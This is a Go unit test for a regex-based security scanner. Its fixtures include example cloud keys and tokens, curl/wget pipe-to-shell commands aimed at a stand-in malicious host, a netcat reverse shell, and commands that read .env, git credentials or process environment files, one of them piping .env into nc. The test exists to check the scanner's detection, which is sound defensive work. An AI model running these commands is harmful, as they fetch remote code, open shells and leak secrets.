package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIA" + "IOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_" + "123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA " + "PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890" + "abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | " + "bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | " + "sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "n" + "c -e /bin/" + "sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		{
			name:        "Cat Env File",
			content:     "cat " + ".e" + "nv",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Redirection Env",
			content:     "cat<" + ".e" + "nv",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Git Credentials",
			content:     "cat " + ".git-" + "credentials",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Proc Environ",
			content:     "cat " + "/proc/self/" + "environ",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Safe Config File",
			content:     "cat my.config",
			wantFinding: "",
		},
		{
			name:        "Safe Config JS",
			content:     "cat src/config.js",
			wantFinding: "",
		},
		{
			name:        "Cat Dot Config",
			content:     "cat " + ".con" + "fig/" + "config.toml",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Safe Env False Positive",
			content:     "cat .environment",
			wantFinding: "",
		},
		{
			name:        "Safe Envelope False Positive",
			content:     "rm .envelope",
			wantFinding: "",
		},
		{
			name:        "Safe Env Example False Positive",
			content:     "cat .env.example",
			wantFinding: "",
		},
		{
			name:        "Cat Env End of String",
			content:     "cat " + ".e" + "nv",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Env Semicolon",
			content:     "cat " + ".e" + "nv;",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Env Pipe",
			content:     "cat " + ".e" + "nv|nc",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Env Ampersand",
			content:     "cat " + ".e" + "nv&",
			wantFinding: "Dangerous Command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
